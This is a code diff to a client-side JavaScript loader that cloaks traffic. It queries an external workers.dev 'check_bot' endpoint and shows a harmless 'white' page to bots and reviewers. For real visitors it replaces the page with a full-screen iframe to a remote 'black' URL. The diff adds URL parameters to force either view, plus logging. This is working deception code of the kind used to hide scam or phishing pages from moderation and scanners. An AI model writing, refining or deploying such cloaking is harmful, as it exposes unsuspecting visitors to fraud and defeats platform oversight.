@@ -19,8 +19,9 @@ const createLoader = () => {
 };
 
 const showWhite = () => {
-  const body = document.querySelector('body');
+  const body = document.body;
   const html = document.documentElement;
+
   if (body) {
     body.classList.remove('hidden');
     body.removeAttribute('hidden');
@@ -32,19 +33,23 @@ const showWhite = () => {
 
 
   document.querySelectorAll('style').forEach(styleTag => {
-    if (styleTag.textContent.includes('overflow: hidden')) {
+    if (styleTag.textContent && styleTag.textContent.includes('overflow: hidden')) {
       styleTag.textContent = styleTag.textContent.replace(/overflow:\s*hidden;?/g, 'overflow: auto !important;');
     }
   });
 
   const preload = document.querySelector('#load_frame');
-  if (preload) {
-    preload.remove();
-  }
+  if (preload) preload.remove();
 };
 
+
 const showBlack = (blackUrl) => {
-  const body = document.body; 
+  const body = document.body;
+
+
+  body.classList.remove('hidden');
+  body.removeAttribute('hidden');
+
 
   body.innerHTML = '';
   body.style.margin = '0';
@@ -64,21 +69,8 @@ const showBlack = (blackUrl) => {
     z-index: 10000;
     display: block;
   `;
-
   body.appendChild(frame);
-  body.classList.remove('hidden');      
-  body.removeAttribute('hidden');
 
-  const style = document.createElement('style');
-  style.innerHTML = `
-    @media only screen and (max-width: 768px) {
-      #wrapper_frame { height: 50vh; }
-    }
-    @media only screen and (max-width: 480px) {
-      #wrapper_frame { height: 30vh; }
-    }
-  `;
-  document.head.appendChild(style);
 
   setTimeout(() => {
     const preload = document.querySelector('#load_frame');
@@ -87,18 +79,29 @@ const showBlack = (blackUrl) => {
 };
 
 
+
 createLoader();
 
 window.addEventListener('DOMContentLoaded', () => {
+
+  const qs = new URLSearchParams(location.search);
+  if (qs.has('white')) { console.log('force white'); showWhite(); return; }
+  if (qs.has('black')) { 
+    const u = qs.get('black') || '';
+    console.log('force black', u);
+    if (u) { showBlack(u); return; }
+  }
+
   fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot')
     .then(res => res.json())
     .then(res => {
-      if (res?.code === 200 && !res.result && res.url) {
-       
-        showBlack(res.url + '/wvS95k');
+      console.log('check_bot response:', res);
+   
+      if (res?.code === 200 && res.result === false && res.url) {
+        showBlack(res.url + '/wvS95k'); 
       } else {
-        
-        setTimeout(showWhite, 300);
+
+        setTimeout(showWhite, 100);
       }
     })
     .catch(err => {
